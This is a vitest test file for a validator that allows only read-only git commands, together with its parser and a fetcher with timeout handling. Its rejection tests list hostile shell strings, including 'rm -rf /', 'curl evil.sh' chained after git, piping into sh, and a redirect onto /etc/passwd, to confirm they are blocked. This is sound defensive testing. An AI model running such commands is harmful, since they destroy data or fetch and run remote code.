/**
 * recon read-only shell sources (E2) — the `shell:<cmd>` want kind.
 * Covers the allowlist (the security boundary), the parser, and the
 * timeout/isolation contract of the fold.
 */

import { describe, expect, it, vi } from "vitest";
import {
  type ShellRunner,
  fetchShellSources,
  parseShellWants,
  validateReadonlyShell,
} from "../intelligence/recon-shell-sources.js";

describe("validateReadonlyShell", () => {
  it("accepts read-only git commands and returns an argv array", () => {
    const r = validateReadonlyShell("git log -n3 -- src/foo.ts");
    expect(r.ok).toBe(true);
    expect(r.ok && r.argv).toEqual(["git", "log", "-n3", "--", "src/foo.ts"]);
  });

  it("accepts blame/show/diff/shortlog/status", () => {
    for (const sub of ["blame", "show", "diff", "shortlog", "status"]) {
      expect(validateReadonlyShell(`git ${sub} src/foo.ts`).ok).toBe(true);
    }
  });

  it("rejects a non-git command", () => {
    expect(validateReadonlyShell("ls -la").ok).toBe(false);
    expect(validateReadonlyShell("rm -rf /").ok).toBe(false);
  });

  it("rejects a git subcommand that mutates state", () => {
    for (const sub of ["push", "commit", "checkout", "reset", "clean", "rm"]) {
      expect(validateReadonlyShell(`git ${sub}`).ok).toBe(false);
    }
  });

  it("rejects shell metacharacters (chaining, redirect, expansion, escape)", () => {
    const evil = [
      "git log; rm -rf /",
      "git log && curl evil.sh",
      "git log | sh",
      "git log > /etc/passwd",
      "git log `whoami`",
      "git log $(whoami)",
      "git log\nrm -rf /",
      'git log "x"',
      "git log 'x'",
      "git log $HOME",
    ];
    for (const cmd of evil) expect(validateReadonlyShell(cmd).ok).toBe(false);
  });

  it("rejects file-writing flags on an otherwise read-only subcommand", () => {
    expect(validateReadonlyShell("git diff --output=evil.txt").ok).toBe(false);
    expect(validateReadonlyShell("git diff -o evil.txt").ok).toBe(false);
  });

  it("rejects empty / bare git", () => {
    expect(validateReadonlyShell("").ok).toBe(false);
    expect(validateReadonlyShell("git").ok).toBe(false);
  });
});

describe("parseShellWants", () => {
  it("pulls shell: tokens, strips the prefix, keeps colons in the command", () => {
    const wants = parseShellWants([
      "shell:git log -n3 -- src/foo.ts",
      "postgres:orders", // not a shell want
      "shell:git show HEAD~1:src/foo.ts", // ref contains a colon
    ]);
    expect(wants.map((w) => w.cmd)).toEqual([
      "git log -n3 -- src/foo.ts",
      "git show HEAD~1:src/foo.ts",
    ]);
  });

  it("dedupes, drops empties and non-strings", () => {
    const wants = parseShellWants([
      "shell:git log",
      "shell:git log",
      "shell:",
      42,
      null,
    ]);
    expect(wants.length).toBe(1);
  });

  it("returns [] for a non-array", () => {
    expect(parseShellWants("shell:git log")).toEqual([]);
  });
});

describe("fetchShellSources", () => {
  const okRunner: ShellRunner = vi.fn(async (argv) => ({
    stdout: `ran: ${argv.join(" ")}`,
    truncated: false,
  }));

  it("runs an allowlisted command via the injected runner", async () => {
    const r = await fetchShellSources(
      [{ cmd: "git log -n1", raw: "shell:git log -n1" }],
      okRunner
    );
    expect(r.sections.length).toBe(1);
    expect(r.sections[0]?.data).toContain("ran: git log -n1");
    expect(r.dropped.length).toBe(0);
  });

  it("never invokes the runner for a disallowed command — drops not_allowed", async () => {
    const runner = vi.fn(okRunner);
    const r = await fetchShellSources(
      [{ cmd: "rm -rf /", raw: "shell:rm -rf /" }],
      runner
    );
    expect(runner).not.toHaveBeenCalled();
    expect(r.sections.length).toBe(0);
    expect(r.dropped[0]?.reason).toBe("not_allowed");
  });

  it("isolates a throwing command as a dropped error, others still run", async () => {
    const runner: ShellRunner = vi.fn(async (argv) => {
      if (argv.includes("blame")) throw new Error("boom");
      return { stdout: "ok", truncated: false };
    });
    const r = await fetchShellSources(
      [
        { cmd: "git blame src/a.ts", raw: "shell:git blame src/a.ts" },
        { cmd: "git log", raw: "shell:git log" },
      ],
      runner
    );
    expect(r.sections.length).toBe(1);
    expect(r.dropped[0]?.reason).toBe("error");
  });

  it("drops a command that exceeds the timeout", async () => {
    const slow: ShellRunner = () => new Promise(() => {}); // never resolves
    const r = await fetchShellSources(
      [{ cmd: "git log", raw: "shell:git log" }],
      slow,
      { timeoutMs: 20 }
    );
    expect(r.sections.length).toBe(0);
    expect(r.dropped[0]?.reason).toBe("timeout");
  });

  it("marks truncated output", async () => {
    const runner: ShellRunner = async () => ({ stdout: "x", truncated: true });
    const r = await fetchShellSources(
      [{ cmd: "git log", raw: "shell:git log" }],
      runner
    );
    expect(String(r.sections[0]?.data)).toContain("output truncated");
  });

  it("returns empty for no wants", async () => {
    const r = await fetchShellSources([], okRunner);
    expect(r).toEqual({ sections: [], dropped: [] });
  });
});
